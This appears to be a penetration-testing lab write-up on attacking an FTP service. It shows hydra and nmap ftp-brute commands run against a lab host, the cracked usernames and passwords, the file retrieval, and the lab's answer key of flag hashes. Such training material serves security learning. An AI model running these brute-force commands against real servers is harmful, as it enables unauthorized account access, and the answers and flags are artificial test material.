Storing files on a server to access remotely 
Default port is 21 

#### Tools
FTP
Hydra

#### Commands
Connect to the target IP address over ftp
```
ftp target_ip
```

Brute force ftp login (get usernames)
```
hydra -L usr/share/metasploit/data/wordlists/username_file -p usr/share/metasploit/data/wordlists/password_file ftp://10.1.0.11 -V
```

List current directory 
```
ftp> ls 
```

Get file from ftp server
```
ftp> get file_name
```

Brute force with nmap
```
nmap target_ip --script ftp-brute --script-args userdb=/root/username_file -p 21 
```

### Lab Questions
1.  What is the version of FTP server?
```
nmap -sS -sV 192.211.130.3

ProFTPD 1.3.5a
```

2.  Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  192.211.130.3 -t 4 ftp 

[21][ftp] host: 192.211.130.3   login: sysadmin   password: 654321
[21][ftp] host: 192.211.130.3   login: rooty   password: qwerty
[21][ftp] host: 192.211.130.3   login: demo   password: butterfly
[STATUS] 3048.00 tries/min, 3048 tries in 00:01h, 4015 to do in 00:02h, 4 active
[21][ftp] host: 192.211.130.3   login: auditor   password: chocolate
[21][ftp] host: 192.211.130.3   login: anon   password: purple
[STATUS] 2548.00 tries/min, 5096 tries in 00:02h, 1967 to do in 00:01h, 4 active
[21][ftp] host: 192.211.130.3   login: administrator   password: tweety
[21][ftp] host: 192.211.130.3   login: diag   password: tigger
```

3.  Find the password of user “sysadmin” using nmap script.
Add username sysadmin to a text file
```
touch users
nano users

sysadmin
```

Run nmap script against the target IP address with 
```
nmap 192.211.130.3 --script ftp-brute --script-args userdb=/root/users -p 21

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 25 guesses in 6 seconds, average tps: 4.2
MAC Address: 02:42:C0:D3:82:03 (Unknown)
```

4.  Find seven flags hidden on the server.

Login to ftp server
```
ftp 192.211.130.3
username=sysadmin
password=654321
```

Extract Secrets from server,
```
ls -al 
get secret.txt

260ca9dd8a4577fc00b7bd5810298076
```

### Lab Answers
1. ProFTPD 1.3.5a
2.   Users: sysadmin, rooty, demo, auditor, anon, admininstrator, diag
3. 654321
4. 260ca9dd8a4577fc00b7bd5810298076

### Extra 
Username=auditor Password=chocolate
secret=098f6bcd4621d373cade4e832627b4f6

Username=rooty    Password=qwerty
secret=e529a9cea4a728eb9c5828b13b22844c

Username=demo  Password=butterfly
secret=d6a6bc0db10694a2d90e3a69648f3a03

Username=anon  Password=purple
secret=1bc29b36f623ba82aaf6724fd3b16718

Username=diag  Password=tigger
secret=12a032ce9179c32a6c7ab397b9d871fa

